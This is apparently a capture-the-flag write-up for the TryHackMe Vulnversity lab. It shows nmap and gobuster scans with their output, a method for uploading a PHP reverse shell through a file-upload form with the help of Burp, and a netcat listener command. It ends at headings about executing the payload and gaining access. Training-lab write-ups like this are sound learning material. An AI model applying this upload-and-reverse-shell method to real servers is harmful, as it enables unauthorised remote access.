# [Vulnversity](https://tryhackme.com/r/room/vulnversity)

## Enumeration

### Nmap Scan
`nmap -sC -sV -T4 -p- -oN nmap.txt 10.10.118.67`
```
# Nmap 7.93 scan initiated Thu Apr 11 21:27:32 2024 as: nmap -sC -sV -T4 -p- -oN nmap.txt 10.10.19.43
Warning: 10.10.19.43 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.19.43
Host is up (0.35s latency).
Not shown: 64870 closed tcp ports (conn-refused), 659 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a4ffcb8c8761cb5851cacb286411c5a (RSA)
|   256 ac9dec44610c28850088e968e9d0cb3d (ECDSA)
|_  256 3050cb705a865722cb52d93634dca558 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-04-11T11:45:53-04:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-04-11T15:45:53
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 11 22:16:05 2024 -- 1 IP address (1 host up) scanned in 2913.22 seconds
```
### Gobuster Directory Fuzzing

We will be using Seclist for directory fuzzing

`gobuster dir --url http://10.10.118.67:3333 -w /opt/SecLists/Discovery/Web-Content/common.txt`
```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.118.67:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/04/11 23:38:50 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 293]
/.htaccess            (Status: 403) [Size: 298]
/.htpasswd            (Status: 403) [Size: 298]
/css                  (Status: 301) [Size: 317] [--> http://10.10.118.67:3333/css/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.118.67:3333/fonts/]
/images               (Status: 301) [Size: 320] [--> http://10.10.118.67:3333/images/]
/index.html           (Status: 200) [Size: 33014]
/internal             (Status: 301) [Size: 322] [--> http://10.10.118.67:3333/internal/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.118.67:3333/js/]
/server-status        (Status: 403) [Size: 302]
Progress: 4727 / 4727 (100.00%)
===============================================================
2024/04/11 23:43:01 Finished
===============================================================
```

`/internal` directory looks interesting. Let us have a look.

![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/internal_directory.png)

We have found a form to upload files.we can take advantage of this feature to upload and execute our payload.
Let's try uploading a php reverse shell and intercept the traffic.

We will be using `php-reverse-shell.php` by [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).
Before uploading the reverse shell make sure to change the `$ip` variable to our machine ip address and `$port`
to our desired port number.

![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/php-chg-ip.png)

![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/burp-intercept.png)


### sniper location
![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/select.png)

### sniper wordlist
![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/wordlist.png)

### length diff
![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/length-diff.png)

### success
![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/success.png)

### listen netcat
```
nc -lvnp 1337
```

### execute the payload
### gain access
